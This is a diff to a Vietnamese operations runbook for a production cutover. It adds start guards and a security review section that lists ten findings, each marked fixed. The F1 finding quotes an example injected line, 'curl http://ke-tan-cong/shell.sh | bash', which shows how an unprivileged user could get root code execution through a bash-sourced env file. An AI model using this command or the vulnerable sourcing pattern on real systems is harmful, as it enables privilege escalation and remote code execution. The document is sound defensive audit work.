@@ -146,10 +146,90 @@ duoc, **KHONG DOC lai duoc**) -> root kiem bang `validate_prod_env.py` ->
 
 ### Rao chan quan trong nhat
 
-`fanfic-prod-admin start` **TU CHOI** khi bat ky unit staging nao tren cung
-may con `active`. Mot may chay ca hai la mot may claim job cua ca hai du an
-— che do that bai nguy hiem nhat cua toan bo ke hoach, va no la bai kiem so
-0 o ca ba tang (bash, Python, unit test).
+`fanfic-prod-admin start` **TU CHOI** khi:
+
+1. tep env khong qua `validate_prod_env.py`
+2. bat ky unit **staging** nao tren cung may con `active`
+3. co worker **NGOAI** may nay dang giu mot lease con han tren hang doi
+   production (`prod_start_guard.py`)
+
+Rao chan 3 ton tai vi rao chan "GCE phai da dung" cua bo dieu phoi song
+tren may DIEU HANH, con verb `start` thi den tu mot hang doi ma ben
+khong-dac-quyen ghi duoc — nen no co the toi ma khong he di qua bo dieu
+phoi. Gioi han that, noi thang: khi hang doi RONG khong co lease nao de
+doc, nen no khong phat hien duoc mot GCE dang chay nhung ranh. Doi lai,
+khi hang doi rong thi cung khong co viec gi de trung.
+
+---
+
+## 2b. RA SOAT BAO MAT DOC LAP — 10 PHAT HIEN, DA SUA HET
+
+Ban ra soat doi khang do **Antigravity Claude Opus** thuc hien
+(`2026-09-04`, 751 giay, packet 135 KB) tra ve **STATUS: UNSAFE** voi
+1 CRITICAL, 2 HIGH, 4 MEDIUM, 3 LOW. Tat ca da duoc sua tai goc va co bai
+kiem hoi quy rieng (`server/tests/test_cutover_injection.py`).
+
+### F1 (CRITICAL) — leo thang quyen `ubuntu` -> root
+
+Lo hong **that**, khong phai gia thuyet. Bo phan tich Python bo qua moi
+dong khong co `=`; con tep env thi duoc `bash` doc bang
+`. <(tr -d '\r' < "$ENV_PROD")` **bang root**. Nen:
+
+```
+# ubuntu ghi env.stage co them mot dong:
+curl http://ke-tan-cong/shell.sh | bash
+# -> `install-env` kiem: DAT (bo phan tich bo qua dong do)
+# -> `preflight`   : bash SOURCE tep -> dong do chay bang ROOT
+```
+
+Ke tan cong **khong can mot credential that nao**: moi toa do khong-bi-mat
+deu nam san trong ma nguon, con bi mat thi chi can khac rong.
+
+| Hang muc | Truoc khi sua | Sau khi sua |
+|---|---|---|
+| Doc tep env | `bash` **source** (thuc thi) | Python **phan tich** (`doc_env_text`) — khong con duong `source` nao |
+| Cai tep env | copy tep **tho** | cai ban **sinh lai** tu allowlist (`--emit`) |
+| Bien ngoai allowlist | bo qua im lang | **tu choi** |
+| Gia tri chua `$ ` `` ` `` `;` `\|` `&` `<` `>` `\` newline | cho qua | **tu choi** |
+| Kiem sau khi sinh lai | khong co | kiem **lan hai** truoc khi dat vao `/etc` |
+
+Ba lop doc lap: khong con sink, noi dung duoc sinh lai, va gia tri bi loc.
+
+### F2 + F3 (HIGH/MEDIUM) — ma cua ben khong-dac-quyen chay bang root
+
+Trinh cai tung lui ve `/home/ubuntu/fanfic_prod_admin.sh` khi checkout
+thieu tep. Mot lan `git fetch` that bai la du de dat **ma cua ke tan cong**
+vao `/usr/local/sbin/fanfic-prod-admin`, chay bang root moi 15 giay. Duong
+lui do **da bi go bo**; nguon duy nhat la checkout git (thuoc root), va
+lenh nguoi van hanh chay cung tro thang vao checkout chu khong vao `/home`.
+
+### F5 (HIGH) — `start` khong co rao chan worker ngoai
+
+Da them `prod_start_guard.py`, xem muc tren.
+
+### F6, F7, F9, F10 (MEDIUM/LOW)
+
+| Ma | Van de | Sua |
+|---|---|---|
+| F6 | `observe` khong theo doi GCE; mot dong doi bat lai GCE giua cua so 30 phut la khong ai biet | moi vong lay mau doc ca GCE; GCE song lai -> **dung ngay**, va **khong** tu dong lui (lui la bat GCE, ma GCE dang chay san — can nguoi chon giu ben nao) |
+| F7 | `rollback` bo qua ma thoat cua buoc dung AWS roi van bat GCE -> ca hai cung chay | doc lai trang thai THAT cua AWS; con `active` thi **khong** bat GCE, tra ma 3 |
+| F9 | TOCTOU giua "hang doi rong" va `disable` tren GCE | do lai ngay truoc khi dung; co job moi -> huy DRAIN. Thu hep cua so, **khong** dong duoc hoan toan — noi thang thay vi gia vo |
+| F10 | `rollback` bao PASS chi dua vao `is-active` sau 15 giay | doc **hai lan** cach nhau, va doi **nhip moi** tu `--check` (bang chung vong quet dang quay, khong chi tien trinh con song) |
+
+### F4, F8 (LOW)
+
+`F4` — nhat ky kiem toan da chuyen ra **ngoai** cay git
+(`~/.fanfic/cutover-audit.jsonl`, doi duoc bang `FANFIC_CUTOVER_AUDIT`):
+mot lan `git add -A` khong con keo no vao lich su kho.
+
+`F8` — ban khang dinh nguoc gio kiem **ca bon** toa do (them
+`APPWRITE_ENDPOINT`, `APPWRITE_DATABASE_ID`), doi xung voi ban xuoi.
+
+### Goal 2 (ro ri bi mat) — khong co phat hien HIGH/CRITICAL
+
+Ban ra soat ket luan ky luat xu ly bi mat la **manh**: `tom_tat_env` che
+gia tri, `render_env_text` chi phat `KEY=VALUE` cho ten trong allowlist,
+bi mat di qua stdin cua SSH chu khong qua argv, tep env `0640 root:fanfic`.
 
 ---
 
@@ -188,12 +268,19 @@ va that bai neu ai do them `json.load`/`read_text` vao do.
 Cai cong dieu hanh production, **mot lan**, tren may AWS:
 
 ```bash
-ssh -i ~/.ssh/<khoa>.pem ubuntu@<ip-aws> 'sudo bash /home/ubuntu/install_prod_admin.sh'
+ssh -i ~/.ssh/<khoa>.pem ubuntu@<ip-aws> \
+  'sudo git -C /opt/fanfic-audio fetch origin \
+   && sudo git -C /opt/fanfic-audio reset --hard origin/main \
+   && sudo bash /opt/fanfic-audio/scripts/ops/install_prod_admin.sh'
 ```
 
-`prepare` tu stage hai tep len `/home/ubuntu` truoc, roi in dung dong lenh
-nay ra va dung lai voi ma thoat `10`. Trinh cai **khong bat dich vu nao** —
-cai xong may van dung yen.
+**Vi sao chay tu `/opt` chu khong tu `/home/ubuntu`:** ban truoc bao nguoi
+van hanh `sudo bash /home/ubuntu/install_prod_admin.sh`. Giua luc `scp` va
+luc nguoi van hanh go lenh, `ubuntu` **thay duoc tep do** — nguoi van hanh
+se chay ma cua ke tan cong bang root (phat hien F2). `/opt/fanfic-audio`
+thuoc root va noi dung den tu git, nen khong co cua so do.
+
+Trinh cai **khong bat dich vu nao** — cai xong may van dung yen.
 
 Credential production **khong** can nguoi: chung den tu Render qua
 `fanfic_credential_broker` (khoa Render nam trong Windows Credential
